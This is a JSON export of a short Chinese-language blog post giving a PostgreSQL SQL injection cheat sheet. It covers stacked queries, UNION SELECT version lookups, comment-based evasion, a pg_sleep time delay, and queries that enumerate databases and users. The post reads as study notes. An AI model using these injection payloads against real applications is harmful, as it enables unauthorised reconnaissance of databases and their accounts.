{"title":"PostgreSQL","slug":"PostgreSQL","date":"2020-02-22T12:39:59.339Z","updated":"2020-02-22T12:41:08.329Z","comments":true,"path":"api/articles/PostgreSQL.json","photos":[],"link":"","excerpt":"PostgreSQL注入基本特性查看版本:​    version()1<br>2<br>select * from users where name='tom' and(1=1);select version()\\g<br>select * from users where name='tom' union select 1,version(),'far';<br>注释符:","covers":null,"content":"<h2 id=\"PostgreSQL注入\"><a href=\"#PostgreSQL注入\" class=\"headerlink\" title=\"PostgreSQL注入\"></a>PostgreSQL注入</h2><h3 id=\"基本特性\"><a href=\"#基本特性\" class=\"headerlink\" title=\"基本特性\"></a>基本特性</h3><h4 id=\"查看版本\"><a href=\"#查看版本\" class=\"headerlink\" title=\"查看版本:\"></a><strong>查看版本:</strong></h4><p>​    version()</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">users</span> <span class=\"keyword\">where</span> <span class=\"keyword\">name</span>=<span class=\"string\">'tom'</span> <span class=\"keyword\">and</span>(<span class=\"number\">1</span>=<span class=\"number\">1</span>);<span class=\"keyword\">select</span> <span class=\"keyword\">version</span>()\\g</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">users</span> <span class=\"keyword\">where</span> <span class=\"keyword\">name</span>=<span class=\"string\">'tom'</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"keyword\">version</span>(),<span class=\"string\">'far'</span>;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"注释符\"><a href=\"#注释符\" class=\"headerlink\" title=\"注释符:\"></a><strong>注释符:</strong><a id=\"more\"></a></h4><p>​    –  /**/</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 1 -- comment</span><br><span class=\"line\">select &#x2F;*comment*&#x2F;1</span><br><span class=\"line\">select * from users where name&#x3D;&#39;tom&#39;and(1&#x3D;1);-- comment 注意空格</span><br><span class=\"line\">select * from users where name&#x3D;&#39;tom&#39;&#x2F;*comment*&#x2F;and(1&#x3D;1);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"时间延迟：\"><a href=\"#时间延迟：\" class=\"headerlink\" title=\"时间延迟：\"></a><strong>时间延迟：</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from users where name&#x3D;&#39;tom&#39;;select pg_sleep(1);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"当前数据库\"><a href=\"#当前数据库\" class=\"headerlink\" title=\"当前数据库:\"></a><strong>当前数据库:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select current_database();</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"列出数据库\"><a href=\"#列出数据库\" class=\"headerlink\" title=\"列出数据库:\"></a><strong>列出数据库:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select datname FROM pg_database;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"当前用户\"><a href=\"#当前用户\" class=\"headerlink\" title=\"当前用户:\"></a><strong>当前用户:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select user;</span><br><span class=\"line\">select current_user;</span><br><span class=\"line\">select session_user;</span><br><span class=\"line\">select getpgusername();</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"列出用户\"><a href=\"#列出用户\" class=\"headerlink\" title=\"列出用户:\"></a><strong>列出用户:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select usename FROM pg_user;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ASCII\"><a href=\"#ASCII\" class=\"headerlink\" title=\"ASCII:\"></a><strong>ASCII:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select chr(x&#39;27&#39;::int); -- &#39;</span><br><span class=\"line\">select ascii(&#39;&#39;&#39;&#39;); -- &#39;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"基本操作\"><a href=\"#基本操作\" class=\"headerlink\" title=\"基本操作\"></a>基本操作</h3><h4 id=\"常见语句\"><a href=\"#常见语句\" class=\"headerlink\" title=\"常见语句\"></a>常见语句</h4><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">alter</span> <span class=\"keyword\">database</span> testdb;</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> <span class=\"keyword\">users</span>(<span class=\"keyword\">id</span> <span class=\"built_in\">int</span> PRIMARY <span class=\"keyword\">KEY</span>,<span class=\"keyword\">name</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">30</span>),<span class=\"keyword\">password</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>));</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> <span class=\"keyword\">users</span>(<span class=\"keyword\">id</span>,<span class=\"keyword\">name</span>,<span class=\"keyword\">password</span>) <span class=\"keyword\">values</span> (<span class=\"number\">0</span>,<span class=\"string\">'tom'</span>,<span class=\"keyword\">md5</span>(<span class=\"string\">'123456'</span>));</span><br><span class=\"line\"><span class=\"keyword\">update</span> <span class=\"keyword\">users</span> <span class=\"keyword\">set</span> <span class=\"keyword\">password</span>=<span class=\"keyword\">md5</span>(<span class=\"string\">'tom'</span>) <span class=\"keyword\">where</span> <span class=\"keyword\">name</span>=<span class=\"string\">'tom'</span>;</span><br></pre></td></tr></table></figure>\n\n","categories":[],"tags":[]}